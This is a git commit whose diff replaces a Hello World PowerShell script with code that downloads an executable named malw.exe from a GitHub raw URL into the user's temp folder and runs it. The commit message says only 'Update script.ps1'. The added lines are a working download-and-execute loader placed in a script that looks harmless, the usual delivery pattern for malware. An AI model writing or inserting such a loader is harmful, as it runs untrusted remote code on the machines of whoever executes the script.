6b2738d34ba467f9e78ab912a37a321e70e52b60
jessiejobston <jessiejobst5@outlook.com>
2025-12-14 08:46:34 -0600

    Update script.ps1

--- script.ps1
+++ script.ps1
@@ -1,2 +1,8 @@
-Write-Host 'Hello World'
-Read-Host
+$url = "https://raw.githubusercontent.com/jessiejobston/mytest/refs/heads/main/malw.exe"
+$out = "$env:TEMP\file.exe"
+
+Invoke-WebRequest -Uri $url -OutFile $out
+Start-Process $out
+
+
+# https://raw.githubusercontent.com/jessiejobston/mytest/refs/heads/main/malw.exe
